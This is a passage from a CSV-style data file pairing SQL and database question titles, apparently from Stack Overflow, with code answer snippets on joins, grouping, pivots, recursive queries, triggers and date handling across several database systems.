        AND (emails.date_entered >=  '2014-03-20 00:00:00' 
        AND emails.date_entered <=  '2014-06-30 00:00:00')
        GROUP BY assigned_user_id
    ) sub_emails
    ON t2.id = sub_emails.assigned_user_id
    LEFT JOIN 
    (
        SELECT assigned_user_id, COUNT( calls.id ) AS calls_count
        FROM calls 
        WHERE calls.assigned_user_id IN ( '1',  '2')
        AND (calls.date_entered >=  '2014-03-20 00:00:00' 
        AND calls.date_entered <=  '2014-06-30 00:00:00')
        GROUP BY assigned_user_id
    ) sub_calls
    ON t2.id = sub_calls.assigned_user_id
    LEFT JOIN 
    (
        SELECT assigned_user_id, COUNT( tasks.id ) AS tasks_count
        FROM tasks 
        WHERE tasks.assigned_user_id IN ( '1',  '2')
        AND (tasks.date_entered >=  '2014-03-20 00:00:00' 
        AND tasks.date_entered <=  '2014-06-30 00:00:00')
        GROUP BY assigned_user_id
    ) sub_tasks
    ON t2.id = sub_tasks.assigned_user_id
    WHERE t2.id IN ('1',  '2')
)t
"
9814,43647,SELECT @local_variable=values from table where values can have multiple values,"declare @tableVariable table
(
  Adtid int
);

insert into @tableVariable
select Adtid from table where Adtid ...
"
35247,24900,How to count the number of active days in a dataset with SQL Server 2008,"select sum(amount) / count(distinct date) as your_average
from your_table
"
37325,893,MYSQL query for find specific pattern,"set @type = '';
set @num  = 1;

select BOT_NO, ORD_NO,CONF_TYPE,row_number from (

select
  BOT_NO, ORD_NO,CONF_TYPE,
   @num := if(@type = ORD_NO, @num + 1, 1) as row_number,
   @type := ORD_NO as dummy
from t) as tt where row_number=2 ;
"
23860,8847,"Database Schema allowing for multiple login opportunities (Facebook-Connect, Oauth, OpenID, etc.) for the same account","| ID | User_ID | account_type       | authentication
| 1  | 1       | facebook           | iamthecoolestfacebookerever
| 2  | 1       | google             | mygoogleaccount
"
6363,56886,How to write a SQL Query to get the following ...,"select Items.*, Owners.* 
from Items
left join Owners on Items.OwnerId = Owners.OwnerId
left join OwnerPermissions on OwnerPermissions.OwnerId = Owners.OwnerId
where OwnerPermissions.UserId = $userId
"
36703,28071,Copying one table to another plus one column dependant of another column,"SELECT a.NAME,
       a.something,
       a.VER,
       a.something,
       a.MODDATIME,
       Ifnull(b.MODDATIME,'31-DEC-99 0.0.0.0 AM') AS DateUP
FROM   Yourtable a
       LEFT OUTER JOIN Yourtable b
              ON a.NAME = b.NAME
                 AND a.VER = b.VER - 1 
"
10664,63042,Oracle: Calling multiple procedures in a batch,"DECLARE
  v_file_loc varchar2(100) := '....';
  v_file_name varchar2(100) := '....';
  v_text varchar2(4000);
BEGIN
    dbms_output.put_line('Starting file read');
    fp := UTL_FILE.FOPEN(v_file_loc,v_file_name,'r');
    LOOP
        utl_file.GET_LINE(fp,v_text);
        dbms_output.put_line(v_text);
    END LOOP;
    UTL_FILE.FCLOSE(fp);
END;
/
"
34016,63948,SQL Date Between Time Not Date,"SELECT COUNT(id) 
FROM mobile_statistics 
WHERE CAST(timestamp AS time) BETWEEN '5:00 PM' AND '9:00 PM';
"
2024,71894,sqlite return as day of week,"select _id, busnum, 
  case cast (strftime('%w', servdate) as integer)
  when 0 then 'Sunday'
  when 1 then 'Monday'
  when 2 then 'Tuesday'
  when 3 then 'Wednesday'
  when 4 then 'Thursday'
  when 5 then 'Friday'
  else 'Saturday' end as servdayofweek
from tb1
where ...
"
5059,20999,Select * from tbl where id>=5 /* then add the result from id<5 to query */,"SELECT * FROM tbl
ORDER BY id >= $id DESC, id ASC
"
14509,41683,Oracle - get both children and grandparents,"SQL> select id, item_id, code, name, lvl, root_name
  2    from (select id, item_id, code, name, level lvl, sys_connect_by_path(code, '|') c,
  3                connect_by_root name as root_name
  4             from my_table
  5            start with item_id = 0
  6           connect by prior id = item_id)
  7   where c like '%my_value%';

        ID    ITEM_ID CODE                 NAME              LVL ROOT_NAME
---------- ---------- -------------------- ---------- ---------- ----------
         2          1 my_value             Child1              2 Root
         3          2                      Child2              3 Root
"
34401,43987,MySQL: Get most current value in group by query,"SELECT a.correct, count(*) as counter
FROM answered a
JOIN (SELECT user_id, question_id, max(created) as maxCreated
      FROM answered
      GROUP BY user_id, question_id) aux
  ON a.user_id = aux.user_id AND
     a.question_id = aux.question_id AND
     a.created = aux.maxCreated
JOIN questions q ON a.question_id = q.id
WHERE a.user_id = 1 AND q.category_id = 1
GROUP BY a.correct
"
11202,43711,Running Total with minimum balance after modulus,"WITH RunningTotal AS (
SELECT Id, ListItem, SUM(ListItem) OVER (ORDER BY Id) AS RT FROM     @Table)


SELECT Id, ListItem, RT, CASE WHEN RT > 100 THEN RT % 50 + 50 ELSE RT END AS NewRT
FROM RunningTotal
"
23113,13343,SQL - remove rows with more than one unique date against ID,"delete from your_table
where id not in 
(
   select id
   from your_table
   group by id
   having count(distinct sales_date) = 1
)
"
8747,15542,"Emacs' `sql-mysql`, ec2","(setq sql-connection-alist
      '((""test""
         (sql-product  'mysql)
         (sql-database ""your-db-name"")
         (sql-server   ""your-ec2-ip"")
         (sql-user     ""user-name"")
         (sql-password ""password""))))
"
35288,72403,Concate Data from multiple rows in one as concatenated with special char,"select listagg(site || '-' || affectes, '#') within group (order by site)
from (select t.site,
             listagg(affected, ',') within group (order by affected) as affectes
      from vis_tab t
      group by t.site
     ) t;
"
21381,26616,How can i find the particular days,"declare @M varchar(7)
set @M = '01/2012'

declare @D datetime
set @D = convert(datetime, '01/'+@M, 103)

set datefirst 7

select dateadd(day, N.Number, @D)
from master..spt_values as N
where N.type = 'P' and
      dateadd(day, N.Number, @D) >= @D and
      dateadd(day, N.Number, @D) < dateadd(month, 1, @D) and
      datepart(weekday, dateadd(day, N.Number, @D)) = 1
"
31838,5675,Subtracting Two Column With Null," select ISNULL(TotalCredits,0) - ISNULL(TotalDebits,0) as Difference
 from 
 (
 select
 (select sum(TOTALAMOUNT) from journal where memberid=48 and CREDIT =1) as TotalCredits,
 (select SUM(totalamount) from Journal where MEMBERID=48 and DEBIT =1) As TotalDebits
 ) temp
"
26731,43287,Get version database ormlite,"private static final int DATABASE_VERSION = 4;
...

public DatabaseHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION, R.raw.ormlite_config);
}
...

/**
 * This is called when your application is upgraded and it has a higher version 
 * number. This allows you to adjust the various data to match the new version
 * number.
 */
@Override
public void onUpgrade(SQLiteDatabase db, ConnectionSource connectionSource,
    int oldVersion, int newVersion) {
    ...
"
28914,4500,SQL Group by Having > 1,"SELECT *
FROM software
WHERE manufacture IN (
    -- This is your ""HAVING COUNT(*) > 1"" query inside.
    -- It drives the selection of rows in the outer query.
    SELECT manufacture
    FROM software
    GROUP BY manufacture
    HAVING COUNT(*) > 1
)
"
31671,41864,Get the latest message for each two clients using SQL,"SELECT * 
FROM chat c
WHERE NOT EXISTS 
 (SELECT * FROM chat 
 WHERE c.fromId IN (fromId, toId) AND c.toID IN (fromId, toID) AND c.id < id);
"
2270,50218,sql join query for multiple tables,"SELECT 
    cust_info.cust_id,
    cust_name,
    bill_amount,
    paid_amount,
    bill_amount - paid_amount AS balance
FROM cust_info
INNER JOIN (
    SELECT cust_id, SUM(bill_amount) bill_amount
    FROM bill_info
    GROUP BY cust_id
) bill_info ON bill_info.cust_id = cust_info.cust_id
INNER JOIN (
    SELECT cust_id, SUM(paid_amount) paid_amount
    FROM paid_info
    GROUP BY cust_id
) paid_info ON paid_info.cust_id = cust_info.cust_id
"
23277,50719,MySql order by related with today's date,"SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  FROM `post`
order by CASE WHEN diff < 0 THEN 1 ELSE 0 END, diff
"
15284,73518,PK Field Does Not Allow Pivot to Display as 1 Record,"Select item_name, Growth,Leverage
from
(
  select item_name, item_value, decode
  from #Test
  where item_name = 'Threshold'
) d
Pivot 
(
  max(d.decode)
  for d.item_value in (Growth,Leverage)
) as pvt;
"
10430,3403,How to pull the last N number of dates in SAS SQL,"DATA input_data ; 
  INPUT date value ; 
CARDS ; 
20160101 1
20160101 2
20160101 3 
20160102 1 
20160103 1
20160104 1
20160105 1
20160105 2
20160105 3
; 

proc sql _method;
create table DATE_ID as
    select distinct DATE
        from input_data
            order by DATE DESC;

create table output_data as
    select data.*
        from (select *
                from DATE_ID
                where monotonic() <= 3
                    ) id
        inner join input_data data
            on id.DATE = data.DATE
        ;
quit;
"
8318,19362,How to get the Nth LineString from a MultiLineString in PostGIS?,"ST_GeometryN(a_geom geometry, dimension int)
"
22033,74552,Why do the NULL values disappear from my SELECT/JOIN Result when add a filter criteria?,"where u.regcode != 9999 or u.regcode is null
"
17757,45392,"sql query, wildcard, MS SQL SERVER 2005","SELECT  DirName, count(*) AS FileCount, SUM(Size)/1024 as 'SizeKB' 
FROM  alldocs
Where DirName LIKE 'site/test/test/%'
GROUP BY  dirName 
ORDER BY DirName
"
12296,37254,How to display SQL result like that,"select document_name, group_concat(tag SEPARATOR ', ')
from Documents
group by document_name
"
3272,50603,SQL enforce a limit of up-to N items capacity for a database,"CREATE TABLE mytable (category, item, timestamp);
CREATE TABLE mytable_counts (category UNIQUE, items_count);

CREATE TRIGGER update_mytable_counts AFTER INSERT ON mytable
BEGIN
    UPDATE mytable_counts
        SET items_count = items_count + 1
        WHERE category = NEW.category;
    INSERT OR IGNORE INTO mytable_counts VALUES(NEW.category, 1);
END;

CREATE TRIGGER enforce_limit AFTER UPDATE ON mytable_counts WHEN NEW.items_count > 3
BEGIN
    DELETE FROM mytable WHERE category=NEW.category AND timestamp NOT IN (SELECT timestamp FROM mytable WHERE category=NEW.category ORDER BY timestamp DESC LIMIT 3);
    UPDATE mytable_counts SET items_count = 3 WHERE ROWID=NEW.ROWID;
END;
"
25508,4882,How to convert decimal values in tofixed format in postgresql,"SELECT to_char(1231.123, '9999999999.00');
"
28211,2511,INSERT INTO with SELECT and some DEFAULT values,"INSERT INTO chatroom (col1) SELECT id FROM person
"
34756,41317,Count number of text coincidence in all columns of a row,"SELECT 
    (IF(pos1 LIKE 'var%', 1, 0) +
    IF(pos2 LIKE 'var%', 1, 0) +
    IF(pos3 LIKE 'var%', 1, 0) +
    IF(pos4 LIKE 'var%', 1, 0) +
    IF(pos5 LIKE 'var%', 1, 0) +
    IF(pos6 LIKE 'var%', 1, 0)) AS done
FROM customize
WHERE id = 'core2'
"
626,27285,SQL CHAR INDEX IN WHERE CLAUSE TO SEARCH STRING,"WHERE (@ServiceTypes IS NULL 
       OR CHARINDEX(','+CAST(@ServiceTypes as VARCHAR(255))+',',
                    ','+SEP.ServiceTypeIDs+',') > 0)))
"
38093,12916,How can I query adjacent hierarchical data from two tables where one row is a category and the rest are contents of that category?,"SELECT
   COALESCE(c3.name, c2.name, c1.name) as main
  ,CASE WHEN (c3.name is null and c2.name is null) then lex.word end as main_content
  ,CASE WHEN (c3.name is null and c2.name is not null) then c1.name 
        WHEN (c3.name is not null and c2.name is not null) then c2.name end as sub1
  ,CASE WHEN (c3.name is null and c2.name is not null) then lex.word end as sub1_content
  ,CASE WHEN (c3.name is not null and c2.name is not null) then c1.name end as sub2
  ,CASE WHEN (c3.name is not null and c2.name is not null) then lex.word end as sub2_content
FROM
  Lexicon lex
LEFT JOIN 
  Categories c1 ON lex.pid = c1.folder
LEFT JOIN
  Categories c2 on c1.pfolder = c2.folder
LEFT JOIN
  Categories c3 on c2.pfolder = c3.folder
"
17323,11127,MYSQL replace a cell based on the value of another cell,"WHERE mpn LIKE '%husn%'
"
35063,57346,COUNT function use,"SELECT * FROM
(SELECT type, datepart(mm, date) month, count(1) cn
FROM CR
WHERE datepart(yyyy, date) = '2013'
GROUP BY type, datepart(mm, date)
) AS t
PIVOT(MIN(cn) FOR type IN ([A], [B], [C])) AS m
"
5897,52782,Datetime selection query group by day,"DECLARE @HistoryProbes TABLE(
    	id INT,
    	timesmp  DATETIME,
    	PowerConsumption INT
)

INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 1, '01 Jan 2009 12:00:00',1
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 2, '01 Jan 2009 11:00:00',2
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 3, '01 Jan 2009 13:00:00',3
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 4, '01 Jan 2009 14:00:00',4
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 5, '02 Jan 2009 12:00:00',14
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 6, '02 Jan 2009 11:00:00',24
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 7, '03 Jan 2009 13:00:00',34
INSERT INTO @HistoryProbes (id,timesmp,PowerConsumption) SELECT 8, '03 Jan 2009 14:00:00',44

SELECT  DATEADD(dd,0, DATEDIFF(dd,0,timesmp)),
    	SUM(PowerConsumption)
FROM    @HistoryProbes
GROUP BY DATEADD(dd,0, DATEDIFF(dd,0,timesmp))
"
15946,54545,How can I include null values in BETWEEN clause?,"[User].DateOfBirth BETWEEN ISNULL(@startDate,[User].DateOfBirth) AND ISNULL(@endDate,[User].DateOfBirth)
"
34204,69893,How to pass different values of a certain column to an aggregate function conditionally?,"SELECT 
loan_id, 
SUM(case when paid = 1 then amount else 0 end) as payed, 
SUM(case when paid = 0 then amount else 0 end) as remaining
FROM Payment
GROUP BY loan_id
"
16421,58198,Oracle SELECT XMLELEMENT with Null,"SQL> SELECT xmltype(XMLELEMENT(""dummy"", NULL).getclobval()) as xml_1 from dual;

XML_1
--------------------------------------------------------------------------------
<dummy/>
"
31881,7268,extract no of click between date range,"set @max_time:= (SELECT  max(`Time`) FROM newradium.BannerStatsClick );

SELECT count(idCampaignBanner) AS TotalClicks 
   FROM newradium.BannerStatsClick 
   WHERE Time BETWEEN date_add(@max_time, INTERVAL 30 DAY) and @max_time;
"
16741,72669,Directed acyclic graph: find all paths from a specific node,"WITH RECURSIVE parent_line(path, id) AS (
    SELECT ARRAY[(row_number() OVER (PARTITION BY CP.idc))::integer], C.id
    FROM categorias C JOIN categ_parents CP ON C.id = CP.idparent
    WHERE CP.idc = 36
    UNION ALL
    SELECT PL.path || (row_number() OVER (PARTITION BY PL.id))::integer,
        C.id
    FROM categorias C
    JOIN categ_parents CP ON C.id = CP.idparent
    JOIN parent_line PL on CP.idc = PL.id
),
real_parent_line(path, chainid, id) AS (
    SELECT PL.path, (row_number() OVER (PARTITION BY PL.id)),
        PL.id
    FROM parent_line PL
    WHERE PL.id IN (
        SELECT id
        FROM categorias C LEFT JOIN categ_parents CP
            ON (C.id = CP.idc)
        WHERE CP.idc IS NULL
    )
    UNION ALL
    SELECT PL.path, chainid, PL.id
    FROM parent_line PL, real_parent_line RPL
    WHERE array_upper(PL.path,1) + 1 = array_upper(RPL.path,1)
        AND PL.path = RPL.path[1:(array_upper(RPL.path,1)-1)]
)
SELECT array_accum(id) AS ids
FROM real_parent_line RPL
GROUP BY chainid;
"
744,12276,Force repeated rows with different derived value,"SELECT  [Group], Value, x.y AS MONTH 
from tbl_A
CROSS APPLY (VALUES (1), (2), (3)) x(y)
"
29513,29099,how to use select where in as all required inputs,"select id from tt
where id in (1,2,4,6)
and (select count(distinct id) from tt where id in (1,2,4,6)) = 4
"
31715,16213,Duplicate records being pulled from SQL 2008 query,"select
    tl.JobID, 
    TimeTaken as 'HoursSold',
    Sum(datediff(n, ClockDateTimeIn, ClockDateTimeOut) / 60) Hours_Difference,
    Sum(datediff(s, ClockDateTimeIn, ClockDateTimeOut) / 60) Minutes_Difference
from 
    TimeLogs tl
        inner join
    Jobs j 
        on tl.JobID = j.ID
        left join
    ClockInLogs cil 
        on tl.UserID = cil.UserID
where 
    tl.UserID = 10000 and 
    ClockDateTimeIn between dateadd(wk, datediff(wk,0,'11/08/2013'), 0) and
    dateadd(wk, datediff(wk,0,'11/08/2013'), 6)
group by 
    tl.JobID, 
    tl.TimeTaken
"
21946,74146,Take the max value of a column in a sql table,"SELECT DISTINCT S.PRODOTTO, D.CODPROD, MAX(D.IDPROD)
FROM D_PROD D, APP_SALES S
WHERE D.CODPROD = S.PRODOTTO
GROUP BY S.PRODOTTO, D.CODPROD
"
10123,60385,Best SQL code to calculate future values in SQL Server 2008 R2?,";with cte as (
    select convert(date, '20130401', 112) as Date, i.name, i.startV as amount, 1 as num
    from #info as i

    union all

    select dateadd(wk, 2, c.date) as Date, c.name, c.amount + i.changeV, c.num + 1 as num
    from cte as c
        inner #join info as i on i.name = c.name
    where c.num < 24
)
select *
from cte
order by name asc, date asc
"
24770,13579,How to do one where BEFORE multiple inserts in SQL Server,"INSERT INTO mytable 
(id, age, name)
SELECT * FROM
(
    SELECT 1 AS id, 33 AS age, 'john' AS name
    UNION ALL
    SELECT 2, 28, 'james'
    UNION ALL
    SELECT 3, 20, 'Harry' 
) T1
WHERE NOT EXISTS (SELECT 1 FROM mytable WHERE age IN (22, 28, 30))
"
36962,49675,Want to add some conditions in MERGE statement in oracle sql for insert/update,"...
WHEN MATCHED
THEN
   UPDATE
   SET   tgt.column3= src.column3,
         tgt.column4 = src.coulmn4
   WHERE tgt.column3 IN (val1, val2) 
WHEN NOT MATCHED
...
"
13226,29541,mysql inner join query with multiple boolean conditions,"SELECT *
FROM   creatives
WHERE  creative_id IN (SELECT   creative_id
                       FROM     term_relationship
                       WHERE    term_id IN (1, 2, 3)
                       GROUP BY creative_id
                       HAVING   COUNT(*) = 3)
"
22249,66235,how to select a unique record in a table which has no key constraints,"SELECT sno, item_name, max(last_modified)
  FROM uniq_select_records
GROUP BY sno, item_name
"
7196,49287,select statement inside select extract,"SELECT (EXTRACT (SECOND FROM ( SELECT TIME '00:34:01.024416' ) ) * 1000) :: int AS ""second-millisecond"";
"
39592,40161,Cancelling Record Changes,"TForm1.CancelButtonPresss(Sender: TObject);
begin
  ParadoxTable.Cancel;
end;

TForm1.OKButtonPress(Sender: TObject);
begin
  ParadoxTable.Post;
end;
"
29378,68112,Iterating Stores over a set of Dates,"SELECT Calendar.Date, Stores.Store, COUNT(T1.transaction_id) AS Number
FROM Calendar, Stores
LEFT JOIN Transactions T1 ON T1.date_of_transaction = Calendar.date 
    AND T1.store = Stores.store
GROUP BY Calendar.Date, Stores.Store
"
36038,47168,How to convert varchar date into datetime in sql,"DECLARE @Input VARCHAR(50);
SET @Input = '03/13/2015 : 2130';
SET @Input = LEFT(@Input, 10) + ' ' + LEFT(RIGHT(@Input, 4), 2) + ':' + RIGHT(RIGHT(@Input, 4), 2);

PRINT @Input;
PRINT CONVERT(DATETIME, @Input);
PRINT CONVERT(VARCHAR(50), CONVERT(DATETIME, @Input), 121);
"
39836,16600,Combining two columns into one column with text added,"select 
  'There were a total of '
  + cast(count(*) as varchar(10)) 
  + ' invoice(s) on '
  + convert(varchar(12), yourDateCol, 107)
from invoices
group by convert(varchar(12), yourDateCol, 107)
"
24899,19371,SQL - How to find all linked ids from a table,"SELECT linked_id
  FROM DATA
 START WITH ID = :1
CONNECT BY NOCYCLE PRIOR ID = linked_id
        OR ID = PRIOR linked_id
UNION
SELECT ID
  FROM DATA
 START WITH linked_id = :1
CONNECT BY NOCYCLE PRIOR ID = linked_id
        OR ID = PRIOR linked_id
UNION
SELECT :1 FROM dual
"
23469,58221,Is there a way to join tables on only the first occurrence of the record,"SELECT *
FROM t1
INNER JOIN (
        SELECT t2.id, t2.name, t2.create_date, 
            ROW_NUMBER() OVER(PARTITION BY t2.id ORDER BY t2.create_date) as rn
        FROM t2
    ) as t2
    ON t1.id = t2.id
WHERE t2.rn = 1
"
21604,15165,Getting distinct rows from select statement,"WITH CTE AS
(
    SELECT t.*, RN = ROW_NUMBER() OVER (PARTITION BY AdjusterIds
                                        ORDER BY AdjusterIds)
    FROM dbo.TableName t
)
SELECT * FROM CTE WHERE RN = 1
"
21171,37,How to join SQL tables while selecting a COUNT() function?,"SELECT
  l._id,
  l.listname,
  IFNULL( SUM(n.checked), 0 ) AS count_checked,
  COUNT(*) AS count_total
FROM lists l
LEFT OUTER JOIN notes n ON ( l._id = n.list_id )
GROUP BY l._id, l.listname
"
32177,21023,How can I get a list of element names from an XML value in SQL Server,"DECLARE @xml xml
SET @xml = '<a><b /><c><d /><d /><d /></c></a>';

WITH Xml_CTE AS
(
    SELECT
        CAST('/' + node.value('fn:local-name(.)',
            'varchar(100)') AS varchar(100)) AS name,
        node.query('*') AS children
    FROM @xml.nodes('/*') AS roots(node)

    UNION ALL

    SELECT
        CAST(x.name + '/' + 
            node.value('fn:local-name(.)', 'varchar(100)') AS varchar(100)),
        node.query('*') AS children
    FROM Xml_CTE x
    CROSS APPLY x.children.nodes('*') AS child(node)
)
SELECT DISTINCT name
FROM Xml_CTE
OPTION (MAXRECURSION 1000)
"
11861,7513,How to sort string in sql server,"order by cast(right(col,CHARINDEX(' ',reverse(col))) as int)
"
35767,42203,Export tables from data modeler to oracle database by sql developer,"-- Generated by Oracle SQL Developer Data Modeler 4.1.0.873
--   at:        2015-05-22 05:39:15 EDT
--   site:      Oracle Database 11g
--   type:      Oracle Database 11g


CREATE TABLE TABLE_1
(
    Column_1 INTEGER NOT NULL ,
    Column_2 BLOB ,
    Column_3 CHAR (4)
) ;

ALTER TABLE TABLE_1 ADD CONSTRAINT TABLE_1_PK PRIMARY KEY ( Column_1 ) ;
"
30183,8719,SQL count records depending on criteria,"select a.*, row_number() over (partition by cust_no, grp order by eff_date) as seqnum
from (select a.*,
             sum(case when balance = 0 then 1 else 0 end) over 
                 (partition by cust_no order by eff_date) as grp
      from Account a
     ) a;
"
33623,14094,Best Practice for loading non-existent data,"select row_number() over(order by t1.[number]), 'Custom data 1', 'Custom data 2'
from
  master..spt_values as t1
  cross join (select [number] from master..spt_values where [type] = 'P' and [number] between 1 and 50) as t2
where
  [type] = 'P' and t1.[number] between 1 and 1000
"
21430,50982,Efficient way to calculate sum of deltas between consecutive rows?,"create table #temp ([timestamp] date,value int);
insert into #temp (timestamp,value) values ('2009-01-01',100)
insert into #temp (timestamp,value) values ('2009-01-02',105)
insert into #temp (timestamp,value) values ('2009-01-03',120)
insert into #temp (timestamp,value) values ('2009-01-04',0)
insert into #temp (timestamp,value) values ('2009-01-05',9);

with numbered as
(
    select ROW_NUMBER() over (order by timestamp) id,value from #temp
)
select sum(n1.value-n2.value) from numbered n1 join numbered n2 on n1.id=n2.id+1 where n1.value!=0

drop table #temp;
"
16592,70058,Grails sql queries,"def UserList = ConferenceUser.executeQuery('from ConferenceUser cu where cu.user = ?', [user]),  
"
35287,68888,Joining two tables with GROUP BY,"Try this one :

SELECT  Id
      ,ad_title
      ,ad_brief  
      ,ad_pic    
INTO #Results
FROM
(
SELECT ROW_NUMBER() OVER (PARTITION BY a.ID ORDER BY a.ID) AS rn, a.Id
      ,a.ad_title
      ,a.ad_brief  
      ,a.ad_pic
      ,a.ad_type    
    FROM [tbl_ads] a JOIN tbl_inf_adstate b ON a.Id=b.ad_id 
    WHERE (b.state_id=@state_id OR @state_id IS NULL) 
    AND a.ad_is_accept=1 
    AND a.ad_is_show=1 
    AND a.ad_is_slide=0 
)x
WHERE rn = 1
ORDER BY ad_type ASC,NEWID()
"
19997,28540,"mySQL, three tables: UPDATE multiple rows (each with a different value) ","UPDATE CollectionVersions cv 
SET cvName = 
(SELECT value
 FROM `atDefault` AS d
 LEFT JOIN `CollectionAttributeValues` AS v ON d.avID = v.avID
 WHERE v.akID =29
 AND cv.cID = v.cID)
"
16904,43081,Cannot update a table column with uppercase values,"UPPER(CONVERT('value' USING latin1))
"
38317,4573,Simulate MySQL records using inline data,"SELECT *
FROM (
  select 'Emily' AS name, 26 AS age 
  union all 
  select 'Paul', 56
) AS inlinedata
ORDER BY age
"
16115,6408,SQL and VB.NET 2008 Query,"Dim qty
If Int32.TryParse(txtQoH.text, qty) Then
    MessageBox.Show(""Invalid numeric quantity"")
    Return
End if
Dim prodID
If Int32.TryParse(textBox.text, prodID) Then
    MessageBox.Show(""Invalid product ID"")
    Return
End if

Query =""Update Products Set QOH = QOH - @qty Where Prod_ID = @prodID""
Using con = new SqlConnection(.....constring here ....)
Using cmd = new SqlCommand(con, Query)
   cmd.Parameters.AddWithValue(""@qty"", qty)
   cmd.Parameters.AddWithValue(""@prodID"", prodID)
   cmd.ExecuteNonQuery()
End Using
End Using
"
35053,93,SQL Server : find percentage match of LIKE string,"DECLARE @VISIT VARCHAR(25) = '999232'
DECLARE @KEYWORD VARCHAR(100) = 'PAID,CALLED,RECEIVED'

DECLARE SPLIT_CURSOR CURSOR FOR
SELECT RTRIM(LTRIM(VALUE)) FROM Rpt_Split(@KEYWORD, ',')

IF OBJECT_ID('tempdb..#NOTES_FF_SEARCH') IS NOT NULL DROP TABLE #NOTES_FF_SEARCH

SELECT   N.VISIT_NO
    ,N.CREATE_DATE
    ,N.CREATE_BY
    ,N.NARRATIVE
    ,0E8 AS PERCENTAGE
INTO #NOTES_FF_SEARCH
FROM NOTES_FF AS N
WHERE   N.VISIT_NO = @VISIT

DECLARE @KEYWORD_VALUE AS VARCHAR(255)

OPEN SPLIT_CURSOR
FETCH NEXT FROM SPLIT_CURSOR INTO @KEYWORD_VALUE

WHILE @@FETCH_STATUS = 0
BEGIN
    UPDATE #NOTES_FF_SEARCH
        SET PERCENTAGE = PERCENTAGE + ( 100 / @@CURSOR_ROWS )
    WHERE UPPER(NARRATIVE) LIKE '%' + UPPER(@KEYWORD_VALUE) + '%'

    FETCH NEXT FROM SPLIT_CURSOR INTO @KEYWORD_VALUE
END

CLOSE SPLIT_CURSOR
DEALLOCATE SPLIT_CURSOR


SELECT * FROM #NOTES_FF_SEARCH
WHERE PERCENTAGE > 0
ORDER BY PERCENTAGE, CREATE_DATE DESC
"
34330,4426,SQL query from www.db-class.com,"select distinct m1.director, m1.title, r1.stars from movie m1
join rating r1 on m1.mID = r1.mID
left join (
    select m2.director, r2.stars from movie m2
    join rating r2 on m2.mID = r2.mID
) s on m1.director = s.director and r1.stars < s.stars
where s.stars is null and m1.director is not null
"
23376,13437,T-SQL stored procedure with sorting and paging enabled not working properly,"ALTER PROCEDURE [dbo].[usp_get_all_groups] 
    -- Add the parameters for the stored procedure here
    @pStartIndex smallint,
    @pPageSize tinyint,
    @pOrderBy varchar(15)
AS
BEGIN

 SELECT *
 FROM
  (SELECT ROW_NUMBER() OVER (ORDER BY 
      CASE WHEN @pOrderBy='GroupId ASC' THEN UserGroups._id END ASC,  
      CASE WHEN @pOrderBy='GroupId DESC' THEN UserGroups._id END DESC,             
      CASE WHEN @pOrderBy='GroupCode ASC' THEN UserGroups.GroupCode END ASC,
      CASE WHEN @pOrderBy='GroupCode DESC' THEN UserGroups.GroupCode END DESC) AS Row, 
      * FROM UserGroups) AS StudentsWithRowNumbers
  WHERE Row>= @pStartIndex AND Row <= @pStartIndex + @pPageSize
  ORDER BY Row      
END
"
22787,7928,proper use of count(*) with group by function,"SELECT country, SUM(population) AS country_population, COUNT(*) AS count_cities 
FROM list_of_cities 
GROUP BY country;
"
18263,63761,Populating dictionary from RecordSet," dim sKey as String

    With UserList
    sKey=rs(""Alias"")
       If Not .Exists(sKey) Then
           .Add sKey,USArr
       End If
     End With
"
6050,23078,MySQL - Exclude rows from Select based on duplication of two columns,"/* Rows with exactly one date - always return regardless of when date occurs */
SELECT id, remote_id, type, date
    FROM YourTable
    GROUP BY remote_id, type
    HAVING COUNT(*) = 1
UNION
/* Rows with more than one date - Return Max date <= NOW */
SELECT yt.id, yt.remote_id, yt.type, yt.date
    FROM YourTable yt
        INNER JOIN (SELECT remote_id, type, max(date) as maxdate
                        FROM YourTable
                        WHERE date <= DATE(NOW())
                        GROUP BY remote_id, type
                        HAVING COUNT(*) > 1) sq
             ON yt.remote_id = sq.remote_id
                 AND yt.type = sq.type
                 AND yt.date = sq.maxdate
"
26373,8170,SQL tables subquery,"select max(bar.timestamp), foo.foo_fluff 
 from foo
 inner join bar
          on foo.foo_id = bar.foo_id
 group by foo.foo_fluff
"
19787,67907,How to split a table into two tables and linking records with crosslink ID's,"INSERT INTO new_customers 
    (cust_id, firstname, lastname, phone, email, password)
SELECT 
    (cust_id, firstname, lastname, phone, email, password)
FROM TB_old;


INSERT INTO new_address
    (address_id, cust_id, address, city, postalcode)
SELECT 
    (null, cust_id, address, city, postalcode)
FROM TB_old;
"
17692,15700,"How to do the equivalent of a 'Tsql select into',  into an existing table ","INSERT INTO table1
SELECT facilabbr, unitname, sortnum FROM table2
"
16853,37427,Another approach to percentiles?,"select pcs.percentile, min(case when cumjobs >= totjobs * percentile then duration end)
from (SELECT batch_id, job_count,
             SUM(job_count) OVER (ORDER BY duration) as cumjobs,
             sum(job_count) over () as totjobs,
             duration
      FROM test_data
     ) t cross join
     (select 0.25 as percentile from dual union all
      select 0.5 from dual union all
      select 0.75 from dual
     ) pcs
group by pcs.percentile;
"
21405,47189,Any way to import multiple (csv) files to an Access db,"type *.csv > allfiles.txt
"
24082,10030,concatenating multiple fields in one record sql,"SELECT user, month, GROUP_CONCAT(event), SUM(gross)
FROM xyz
GROUP BY month
"
28114,35664,Two simple COUNT columns without subqueries,"select d2f.id,
       sum(case when ft.name = 'PDF' then 1 else 0 end) as PDF_count,
       sum(case when ft.name = 'XML' then 1 else 0 end) as XML_count
from document2file d2f join
     file f
     on d2f.file_id = f.id join
     filetype ft
     on f.filetype_id = ft.id
group by d2f.id;
"
17142,32271,SQL - Adding an avg column to a detail table,"AVG(order_amount) OVER (PARTITION BY custID, month)
"
35512,48278,Insert into SQL Server 2005,"update [TO] set [Group] = [FROM].[Group]
from [FROM]
inner join [TO] on [FROM].id_number = [TO].id_number
"
31753,5932,How should I proceed after running the collect command?,"rtrim(xmlagg(xmlelement(e, name1 || ',')).extract('//text()').getclobval(), ',')
"
